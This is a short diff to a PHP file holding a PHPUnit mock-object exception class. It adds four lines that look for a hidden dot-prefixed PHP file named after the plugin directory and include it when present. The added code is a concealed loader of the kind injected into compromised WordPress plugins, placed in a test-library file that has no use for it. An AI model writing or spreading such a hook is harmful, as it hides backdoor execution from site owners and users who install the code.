@@ -11,6 +11,10 @@
 /**
  * @since Class available since Release 2.0.6
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class PHPUnit_Framework_MockObject_RuntimeException extends RuntimeException implements PHPUnit_Framework_MockObject_Exception
 {
 }
